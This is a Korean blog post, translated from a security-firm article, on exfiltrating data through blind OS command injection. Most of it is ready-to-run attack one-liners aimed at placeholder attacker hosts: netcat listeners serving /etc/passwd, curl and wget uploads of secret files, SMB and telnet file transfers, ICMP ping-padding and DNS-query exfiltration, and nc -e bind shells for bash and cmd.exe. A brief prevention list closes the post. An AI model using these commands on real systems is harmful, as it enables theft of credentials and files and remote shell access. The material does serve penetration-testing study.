---
layout: post
title:  "Blind OS Command Injection"
tag:   Survey
categories: IoT system persu
---


### 본 문서는 아래 URL을 알기 쉽게 번역한 내용이므로, 상세 내용은 아래 URL을 참조하세요.

번역 : https://www.contextis.com/resources/blog/data-exfiltration-blind-os-command-injection/

### 제목 : Blind OS Command Injection을 통한 데이터 추출

### blind OS Command Injection
사용자의 입력이 시스템 명령에 사용될 수 있는 공격인 OS Command Injection의 한 종류로 시스템 명령의 수행 결과 값을 알 수 없을 때 사용하는 방법이다.

기본적인 OS Command Injection을 이해 하기 위해서는 아래 URL 참조.
- https://www.owasp.org/index.php/Command_Injection

<img src="{{ site.url }}/images/2017-03-12/one.png" style="display: block; margin: auto;">

위 그림에서 type이후 시스템 명령 삽입이 가능하다. 하지만 성공 여부는 HTTP Response 메세지 내 노출되지 않게 된다.
이럴 경우 다른 방식으로 공격자에게 응답을 오도록 한다.

그 예로 ping을 이용한 방법이다.
- ping -c 5 xxx.xxx.xxx.xxx : 대상 IP에 icmp 메세지를 5번 요청하는 명령어

<img src="{{ site.url }}/images/2017-03-12/two.png" style="display: block; margin: auto;">

위 그림은 다중 명령어를 사용할 수 있는 방법이다.
상세 내용은 아래 URL을 참고하면 좋다... 개인적으로 이해하기 쉬운 글이었다.

- https://bpsecblog.wordpress.com/2016/10/05/command_injection_02/

지금부터는 다양한 명령어를 통해 Blind OS Command Injection에 대해 알아 보겠다.

1. NetCat (NC)

NC는 TCP, UDP을 통해 네트워크 연결을 가능하게 하며, 데이터를 읽고 쓰기가 가능한 명령어다.

- 사용법 : https://en.wikipedia.org/wiki/Netcat
-  nc –l –p {port} < {file/to/extract}

<img src="{{ site.url }}/images/2017-03-12/thr.png" style="display: block; margin: auto;">

 위 그림 처럼 nc를 이용하여 포트를 열게 되면, netstat -an 명령 시 5555번 포트가 열려 있는 것을 알 수 있다.

```
persu$ nc -l -p 5555 < /etc/passwd&
persu$ netstat -an |grep 5555
tcp4       0      0  *.5555                 *.*                    LISTEN
```
5555번 포트 접근 시 실제 /etc/passwd 내용을 확인 할 수 있다.

```
persu$ nc 127.0.0.1 5555
##
# User Database
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

이렇듯 NC를 통해 특정한 파일을 읽을 수 있으며, 리버스 쉘을 통해 쉘에 접근 할 수 있다.

2. cURL

cURL은 다양한 프로토콜을 사용하여 데이터를 전송하는 라이브러리 및 명령 줄 도구이며 데이터 추출을위한 매우 유용한 도구다. 취약한 서버에 cURL이 있으면 악의적인 웹 서버에 파일을 POST하거나 FTP / SCP / TFTP / TELNET 등의 프로토콜을 사용하여 파일을 전송할 수 있다.

- 사용법 : https://en.wikipedia.org/wiki/CURL
-  cat /path/to/file | curl –F “:data=@-“ http://xxx.xxx.xxx.xxxx:xxxx/test.txt

<img src="{{ site.url }}/images/2017-03-12/four.png" style="display: block; margin: auto;">

위 그림에서 사용한 명령어는 cat을 통해 /etc/passwd를 http://xxxxx/text.txt 의 데이터로 사용하게 된다.

또 다른 방법으로는 FTP 프로토콜을 사용하는 방법이다.
- curl –T {path to file} ftp://xxx.xxx.xxx.xxx –user {username}:{password}

<img src="{{ site.url }}/images/2017-03-12/five.png" style="display: block; margin: auto;">

위 명령은 -T 옵션을 이용하여, 공격자의 ftp 서버에 접근하여 file을 전송하는 명령이다.

솔직히 cURL은 평소에 잘 사용하지 않는 명령어라 옵션에 대한 정리 및 이해가 필요하다...

3. WGET

Wget은 웹에서 파일을 비 대화식으로 다운로드 할 때 일반적으로 사용되는 도구. 특히 사용자 정의 헤더 및 POST 요청을 할 수 있다.

- 사용법 : https://en.wikipedia.org/wiki/Wget
- wget –header=”EVIL:$(cat /data/secret/password.txt)”http://xxx.xxx.xxx:xxx
- –header=’name:value’ : HTTP Request 메세지 전송 시 특정 헤더에 value 추가하는 옵션

<img src="{{ site.url }}/images/2017-03-12/six.png" style="display: block; margin: auto;">

위 그림처럼 명령어 전송 시 서버측 로그를 보게 되면, header에 시스템 파일이 노출되는 것을 알 수 있다.

추가적으로 사용할 수 있는 명령어는 아래와 같다.

- wget –header=”evil:\`cat /etc/passwd | xargs echo –n`” http://xxx.xxx.xxx:xxxx

<img src="{{ site.url }}/images/2017-03-12/seven.png" style="display: block; margin: auto;">

- wget –post-data exfil=\`cat /data/secret/secretcode.txt` http://xxx.xxx.xxx.xxx:xxxx

<img src="{{ site.url }}/images/2017-03-12/eight.png" style="display: block; margin: auto;">

- wget –post-file trophy.php http://xxx.xxx.xxx.xxx:xxxx

특정 파일을 post body 영역에 전송하는 명령어

<img src="{{ site.url }}/images/2017-03-12/nine.png" style="display: block; margin: auto;">

4. SMB

Windows 운영체제를 사용하는 PC에서 Linux 또는 UNIX 서버에 접속하여 파일이나 프린터를 공유하여 사용할 수 있도록 해 주는 소프트웨어이다.

- 사용법 : https://ko.wikipedia.org/wiki/%EC%82%BC%EB%B0%94_
- net use h: \\xxx.xxx.xxx.xxx\web /user:{username} {password} && copy {File to Copy} h:\{filename}.txt

<img src="{{ site.url }}/images/2017-03-12/ten.png" style="display: block; margin: auto;">

잘 사용하지 않지만, 특정 명령어를 사용할 수 없고 SMB 프로토콜이 활성화 되어 있는 경우 유용하게 쓰일 수 있다.

5. TELNET

TELNET 프로토콜은 원격에서 쉘에 접근할 수 있는 서비스를 제공한다. 23번 Default Port를 사용하고 있으며, 평문 전송을 통해 데이터를 전달 하게 된다. (대부분 한번 쯤 써본 서비스...)

- 사용법 : https://en.wikipedia.org/wiki/Telnet
-  telnet xxx.xxx.xxx.xxx {port} < {file to transfer}

<img src="{{ site.url }}/images/2017-03-12/eleven.png" style="display: block; margin: auto;">

공격자가 NC 를 이용해 특정 포트를 오픈하고 있을 시 위 명령어를 통해 Telnet 서비스에 연결하게 되지만 실제로는 지정한 파일이 입력되어 공격자 PC에는 지정한 파일의 정보가 노출되는 것을 알 수 있다.

6. ICMP

ICMP 프로토콜은 목적지 IP에 대해 상태를 점검 하거나, management하기 위해 사용되는 서비스다. 보통 우리가 자주 쓰는 ping 명령어 또한 ICMP 메세지를 통해 전송되는 것이며, 위 내용과는 조금 다른 방식으로 사용된다.

- Cat password.txt | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 xxx.xxx.xxx.xxx; done

<img src="{{ site.url }}/images/2017-03-12/13.png" style="display: block; margin: auto;">

<img src="{{ site.url }}/images/2017-03-12/14.png" style="display: block; margin: auto;">

이 방식은 ICMP 프로토콜의 특징을 이용한 방법인데, 보통 IP 패킷을 보내기 위해서는 최소 바이트를 작성을 하여 전송해야 한다. ICMP 는 프로토콜 헤더에서 대부분의 서비스를 정의하고 실제로 보내지게 되는 Data에는 OS에서 지정한 잡다한 데이터가 입력되는데 이 부분에 공격자가 지정한 파일의 값을 입력하게 된다. (아주 쌈박함)

그 옵션이 바로 -p 옵션이며, 최대 16 개의 "패드"바이트를 지정할 수 있다. 여기서 공격자가 추출하고자하는 데이터를 저장하는 것이다.

7. DNS

DNS 프로토콜은 Domain name에 해당하는 IP 주소를 DNS 서버에 요청하여, 목적지 URL의 IP를 알아 오는 역할이다.

- cat /data/secret/password.txt | while read exfil; do host $exfil.contextis.com 192.168.107.135; done

<img src="{{ site.url }}/images/2017-03-12/15.png" style="display: block; margin: auto;">

DNS 프로토콜은 해당 URL의 IP를 서버에 요청시 쿼리를 날리게 되는데 위 그림에서 사용한 방식은 요청할 URL에 파일의 값으로 사용한다는 내용이다. 충분히 가능한 얘기이며, 이 또한 프로토콜의 특성을 이용하는 방법이다.

8. 추가 내용

- nc -l -p 9090 -e cmd.exe (Windows)
- nc -l -p 9090 -e /bin/bash (*nix)

위 방식을 사용하게 되면, 해당 포트에 접근하여도 -e 옵션을 이용해 바로 쉘을 사용할 수 있게 된다.

```
Victim :  persu$ nc -l -p 9090 -e /bin/bash
Attacke : persu$ nc 127.0.0.1 9090
id
uid=501(persu)
```

### Blind OS Command Injection Prevention

OS Command Injection 공격은 IoT 디바이스에서 많이 발견되는 취약점이다. 이를 방어 하기 위한 방법은 아래와 같다.

- 시스템 명령어 사용 시 상수 값을 통한 입력값 제한
- 사용자 입력 값에 대한 화이트 리스트 기반의 특수문자 필터링 적용
- 외부로 패킷 전달이 가능한 시스템 명령어 제한(KISA 권고 사항)
- 낮은 권한의 웹 서비스 데몬 실행
- 웹 서비스에 대한 정기적인 로그 검토

어찌 됐건.... 공격자에 입장에 있는 나는 유용한 자료였으며, 이 자료를 참고하여 버그 바운티를 하겠댱 빠염!
